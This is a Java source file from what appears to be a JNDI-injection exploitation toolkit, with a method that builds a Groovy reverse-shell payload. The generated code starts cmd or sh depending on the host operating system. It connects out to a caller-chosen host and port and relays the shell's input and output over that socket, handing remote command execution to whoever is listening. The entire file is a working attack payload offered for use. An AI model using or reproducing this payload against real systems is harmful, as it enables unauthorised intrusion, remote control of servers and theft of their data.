package map.jndi.payload;

public class GroovyPayload {
    public static String reverseShell(String host, String port) {
        return "try {\n" +
                "def shell=System.properties['os.name'].toLowerCase().contains('win') ? 'cmd' : 'sh'\n" +
                "def process=new ProcessBuilder(shell).redirectErrorStream(true).start()\n" +
                "def socket=new java.net.Socket('" + host + "', " + port + ")\n" +
                "def pi=process.inputStream\n" +
                "def pe=process.errorStream\n" +
                "def si=socket.inputStream\n" +
                "def po=process.outputStream\n" +
                "def so=socket.outputStream\n" +
                "while (!socket.isClosed()) {\n" +
                "while (pi.available() > 0) so.write(pi.read())\n" +
                "while (pe.available() > 0) so.write(pe.read())\n" +
                "while (si.available() > 0) po.write(si.read())\n" +
                "so.flush()\n" +
                "po.flush()\n" +
                "Thread.sleep(50)\n" +
                "try {\n" +
                "process.exitValue()\n" +
                "break\n" +
                "} catch (ignored) {}\n" +
                "}\n" +
                "process.destroy()\n" +
                "socket.close()\n" +
                "} catch (Exception ignored) {}\n";
    }
}
